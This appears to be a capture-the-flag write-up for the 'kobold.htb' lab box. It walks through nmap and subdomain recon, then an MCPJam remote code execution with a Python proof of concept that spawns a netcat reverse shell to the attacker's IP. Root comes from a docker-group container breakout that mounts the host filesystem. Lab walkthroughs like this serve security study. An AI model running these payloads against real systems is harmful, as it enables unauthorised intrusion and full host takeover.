### Summary
We start this box with HTTP(S) instances and virtual host routing which resolves `kobold.htb`, `bin.kobold.htb` (privatebin instance), and `mcp.kobold.htb` (an MCPJam instsance) which is vulnerable to RCE via CVE-2026-23744. We can use the RCE to get a shell as `ben` on the box, and after further enumeration activate the `docker` group to then mount the root filesystem as a container volume, allowing us to read and modify the host filesystem as `root`

### Tools
- `ffuf`
- `feroxbuster` (to no avail)
- `docker`

###### [[#Recon]]
- [[#Initial Scan]]
	- [[#Subdomain Brute Force]]
- [[#HTTP - TCP 3552]]
- [[#HTTPS - TCP 443]]
	- [[#kobold.htb]]
	- [[#bin.kobold.htb]]
	- [[#mcp.kobold.htb]]
###### [[#User Shell - ben]]
- [[#MCPJam RCE]]
	- [[#poc]]
- [[#Enumeration as ben]]
###### [[#Root Shell]]
- [[#Docker Container Root Filesystem Breakout]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.11.24 -oN nmap/tcp
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
3552/tcp open  taserver syn-ack ttl 63

❯ sudo nmap -p 22,80,443,3552 -sCV -vv 10.129.11.24 -oN nmap/tcpScripts
PORT     STATE SERVICE   REASON         VERSION
22/tcp   open  ssh       syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDyfTq7atQNY2qg78Nt+Q/rowZnmsZ0+vG+FraL750n57MCUNo0a/hw/Df2XfLKPUGiVIVYmQTraVft8Xv2AjYk=
|   256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHDfvijaU/WiU8D/im7cOg8k4NeAOUgCHq16HhCbmZcI
80/tcp   open  http      syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp  open  ssl/http  syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://kobold.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=kobold.htb
| Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
| Issuer: commonName=kobold.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-15T15:08:55
| Not valid after:  2125-02-19T15:08:55
| MD5:   c49e c4d5 d4a0 e473 00bc 8df8 cc00 98ac
| SHA-1: a231 1d00 d15b 2007 eff5 957d 0561 265a bb90 6906
| -----BEGIN CERTIFICATE-----
| MIIDMjCCAhqgAwIBAgIUYYWyqxUgK9B/KXzRH5Qhz8UlYxkwDQYJKoZIhvcNAQEL
| BQAwFTETMBEGA1UEAwwKa29ib2xkLmh0YjAgFw0yNjAzMTUxNTA4NTVaGA8yMTI1
| MDIxOTE1MDg1NVowFTETMBEGA1UEAwwKa29ib2xkLmh0YjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBAJ8HVhVl45uBJYRwEQCmzAEXGqJMK6Wp5BOeaSLD
| 6KJjuSnWLOs5vKTtpHvhlulpnwqa7PmTiUUhjY421T2sn2KNRcCFKyNMJ9Ju6lSe
| ijY6oQ2DEED82QC/1HX6O2XtJUf5JWrGrr1krrS6wrHSrEaTwA0vgwrJlVf/TO+U
| 21Mnv3W1lActy7GMfnehOrz0zWDfYjNB/JuOWHEZdRIDALUicaMUgsReZDmBaLH7
| qMBBS7Eid9a15YNIU0FQ297ufai42rD2rDAndGG+eh6eri6DYMVmffBecbOsh4fv
| Li4PTXk3dvO+7+Fnx8YHCYtGTEv1k/R6o/+xQXLsGboQ5P0CAwEAAaN4MHYwHQYD
| VR0OBBYEFGFtHfv+9EMzqZuSryruA41VtTAZMB8GA1UdIwQYMBaAFGFtHfv+9EMz
| qZuSryruA41VtTAZMA8GA1UdEwEB/wQFMAMBAf8wIwYDVR0RBBwwGoIKa29ib2xk
| Lmh0YoIMKi5rb2JvbGQuaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQCQybOVM+Zo5MTb
| QY/24rWy1ksAuiUqPHCABNprilPvsvBGkIMC6aSLqzR8UXm+4aQzBxNlHsePvkzu
| suuQKAoyCbnId0qii6a1vzeozgIOt+1oqfxFe7mRAiLhboSctFqScC6dy/PDEIOg
| bt+gLfU5iKsjqTQBxcWZr4uj7DtWbRC73OITWSSi/Y/AI66o5VHIUhnJ29gOEJVw
| 5Bv43Iublt2FBH/S6fiz509tJAsqLhp1kmxIAWrV92rBZPSpF4s2xWRbWefZPm7L
| fstlVNlXRrBnPz8iN8JrlpZLmZCUQ+BjMUXjqS27LS9Dl/3agD/F2gNuSho/s1F8
| TI93TWcE
|_-----END CERTIFICATE-----
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
3552/tcp open  taserver? syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: no-cache, no-store, must-revalidate
|     Content-Length: 2081
|     Content-Type: text/html; charset=utf-8
|     Expires: 0
|     Pragma: no-cache
|     Date: Tue, 24 Mar 2026 22:09:56 GMT
|     <!doctype html>
|     <html lang="%lang%">
|     <head>
|     <meta charset="utf-8" />
|     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
|     <meta http-equiv="Pragma" content="no-cache" />
|     <meta http-equiv="Expires" content="0" />
|     <link rel="icon" href="/api/app-images/favicon" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
|     <link rel="manifest" href="/app.webmanifest" />
|     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
|     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
|_    <link rel="modu
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3552-TCP:V=7.92%I=7%D=3/24%Time=69C30BB5%P=x86_64-redhat-linux-gnu%
SF:r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\
SF:x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20B
SF:ad\x20Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Rang
SF:es:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revali
SF:date\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Tue,\x2024
SF:\x20Mar\x202026\x2022:09:56\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20
SF:lang=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<
SF:meta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store
SF:,\x20must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20con
SF:tent=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content
SF:=\"0\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favic
SF:on\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-wi
SF:dth,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x2
SF:0/>\n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\
SF:n\t\t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\
SF:x20media=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20nam
SF:e=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\
SF:x20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x
SF:20rel=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Rang
SF:es:\x20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revali
SF:date\r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Tue,\x2024
SF:\x20Mar\x202026\x2022:09:56\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20
SF:lang=\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<
SF:meta\x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store
SF:,\x20must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20con
SF:tent=\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content
SF:=\"0\"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favic
SF:on\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-wi
SF:dth,\x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x2
SF:0/>\n\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\
SF:n\t\t<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\
SF:x20media=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20nam
SF:e=\"theme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\
SF:x20media=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x
SF:20rel=\"modu");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- The TTL corresponds with a POSIX adherent system
- Given OpenSSH and nginx versions, we're likely working with Ubuntu `24.04`
- Virtual host subdomain routing is in play here, we'll have to brute-force
- Looks like some HTTP server is running on port `3552`

### Subdomain Brute Force
```sh
❯ ffuf -u "https://10.129.11.24" -H "Host: FUZZ.kobold.htb" -w ~/ctf/TOOLS/wordlist/Discovery/DNS/subdomains-top1million-110000.txt -c -ac 
...
mcp           [Status: 200, Size: 466, Words: 57, Lines: 15, Duration: 90ms]
bin           [Status: 200, Size: 24402, Words: 1218, Lines: 386, Duration: 89ms]
```
- We can add `mcp.kobold.htb  bin.kobold.htb  kobold.htb` to our `/etc/hosts` file

## HTTP - TCP 3552
---
- Navigating to `kobold.htb:3552` gives us an instance of [Arcane](https://github.com/getarcaneapp/arcane), a docker management UI
- Wappalyzer tells us the tech stack is `php` sitting on `nginx`
- We're hit with a login page, and trying the default creds from the [documentation](https://getarcane.app/docs/setup/installation) doesn't give us login
- Subdirectory brute-forcing doesn't show us anything interesting
- We'll have to come back if we find any creds

## HTTPS - TCP 443
---
### kobold.htb
- Navigation to `kobold.htb` shows us a site, Kobold Operations Suite
- Wappalyzer tells us it's a `php` based `nginx` site with the `Svelte` JS framework
- There are no interesting links, but there is an email address for `admin@kobold.htb`
- Subdirectory brute-forcing doesn't show us anything interesting

### bin.kobold.htb
- Navigating to `bin.kobold.htb` gives us an instance of [PrivateBin](https://github.com/PrivateBin/PrivateBin), `2.0.2`
- Navigating to the github repo, we see a few security entries that affect our instance, the most notable being a [cookie-based LFI](https://github.com/PrivateBin/PrivateBin/security/advisories/GHSA-g2j9-g8r5-rg82) vulnerability that we could upgrade to RCE if we're able to write a `php` file to the victim
	- It's not necessary for solving the box though
- Subdirectory brute-forcing doesn't show us anything interesting

### mcp.kobold.htb
- Navigating to `mcp.kobold.htb` gives us an instance of [MCPJam](https://github.com/MCPJam/inspector)
- Navigating to the repo shows a single, unpatched critical security entry for [Remote Code Execution](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) 
	- This will be our foothold into the box

# User Shell - ben
## MCPJam RCE
---
- Navigating to the [security advisory](https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6) we see an ugly curl-based POC in the readme
```sh
curl http://10.97.58.83:6274/api/mcp/connect \
	--header "Content-Type: application/json" \
	--data "{\"serverConfig\":{\"command\":\"cmd.exe\",\"args\":[\"/c\", \"calc\"],\"env\":{}},\"serverId\":\"mytest\"}"
```
- It's messy and meant for a windows environment. We can write our own python-based POC in short order though

- The vulnerability is due to the fact MCPInspector listens for all IP addresses, accepting API requests from any host
- When a connection is made to the `/api/mcp/connect` endpoint, the system extracts the command and its arguments and performs no security checks nor authentication, allowing for RCE

### poc
```python
#!/usr/bin/env python3

import requests

ip = "10.10.15.91"
port = 12345
url = "https://mcp.kobold.htb/api/mcp/connect"

data = {
    "serverConfig": {
        "command": "busybox",
        "args": ["nc", f"{ip}", f"{port}", "-e", "bash"],
        "env": {},
    },
    "serverId": "yermother", # unimportant
}

response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)
```
- It took some brute-forcing to find a valid reverse shell payload but this one did the trick

- Set up a `netcat` listener and we get a hit!
```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.11.24.
Ncat: Connection from 10.129.11.24:47742.
```
- From there we can do a standard `script /dev/null -c bash` shell upgrade
- I've also started performing `stty rows [row] columns [col]` after the `fg` since I'm tired of my `nc` terminal being boxed in

## Enumeration as ben
---
- From here we can grab `user.txt`
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ cat ~/user.txt 
7fb7b63884d38c433a05c3048d944359
```

- There's nothing else interesting in our `home` folder
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ find ~/ -type f
/home/ben/.bash_logout
/home/ben/.bash_history
/home/ben/.cache/motd.legal-displayed
/home/ben/.profile
/home/ben/.bashrc
/home/ben/user.txt
```

- There's another user, `alice` on the box
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ grep 'sh$' /etc/passwd
root:x:0:0:root:/root:/bin/bash
ben:x:1001:1001::/home/ben:/bin/bash
alice:x:1002:1002::/home/alice:/bin/bash
```

- `ben` belongs to the `operator` group
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ id
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```
- The group has some directories managing the `PrivateBin` instance
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ find / -type d -group operator 2>/dev/null
/privatebin-data
/privatebin-data/certs
/privatebin-data/data
/privatebin-data/data/bd
/privatebin-data/data/bd/b5
/privatebin-data/data/e3
```
- From here we could drop a `php` remote shell to turn our `PrivateBin` `LFI` vulnerability into `RCE` but, again, not especially useful for solving this box

- There's no passwordless `sudo` or crontabs that we can peek at
- There's a `containerd` folder we don't have permission to view in `/opt`
- There's nothing in `/srv`
- `/var/www` is pretty much empty aside from the `index.html` of the `kobold.htb` page

# Root Shell
## Docker Container Root Filesystem Breakout
---
- The next part had me stumped and I played around with the `PrivateBin` `LFI` to no avail
- It wasn't until I started trying to enumerate what `alice` would have the option to do that I started making progress again
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ groups alice
alice : alice operator docker
```

- `alice` is a member of the `docker` group, which means she likely is able to manage containers with `root` permissions
- We could try performing `sg` (switch groups) to tack the `docker` group onto `ben`
```sh
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ sg docker
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$ groups
docker operator ben
```
- Wow, incredible stuff

- From here we can perform a container breakout by mounting the host filesystem as a container volume
- We can see what image we could use to perform this task with `docker image ls` and we notice `privatebin/nginx-fpm-alpine:2.0.2`
```sh
ben@kobold:~$ docker image inspect f5f5564e6731 | jq .[].Config
{
  "User": "65534:82",
  "ExposedPorts": {
    "8080/tcp": {}
  },
  "Env": [
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/srv/bin",
    "CONFIG_PATH=/srv/cfg"
  ],
  "Entrypoint": [
    "/etc/init.d/rc.local"
  ],
  "Volumes": {
    "/run": {},
    "/srv/data": {},
    "/tmp": {},
    "/var/lib/nginx/tmp": {}
  },
  "WorkingDir": "/var/www",
  "Labels": {
    "org.opencontainers.image.authors": "support@privatebin.org",
    "org.opencontainers.image.documentation": "https://github.com/PrivateBin/docker-nginx-fpm-alpine/blob/master/README.md",
    "org.opencontainers.image.licenses": "zlib-acknowledgement",
    "org.opencontainers.image.source": "https://github.com/PrivateBin/docker-nginx-fpm-alpine",
    "org.opencontainers.image.vendor": "PrivateBin",
    "org.opencontainers.image.version": "2.0.2"
  }
}
```

- This'll do, we have to modify the `--entrypoint` to give us a shell here when we run it from the command line
- We also need to ensure we're running as the `root` user, otherwise we can't peek at the root filesystem when we mount it to the container
```sh
ben@kobold:~$ docker run -u root -it --rm -v /:/hostfs --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2
/var/www # cat /hostfs/root/root.txt 
849800d467ce80bf673c7d99c92132d1
```

- If we want a `root` shell, we can modify the `/hostfs/root/.ssh/authorized_keys` file
```sh
❯ ssh root@10.129.11.24       
...
root@kobold:~#
```





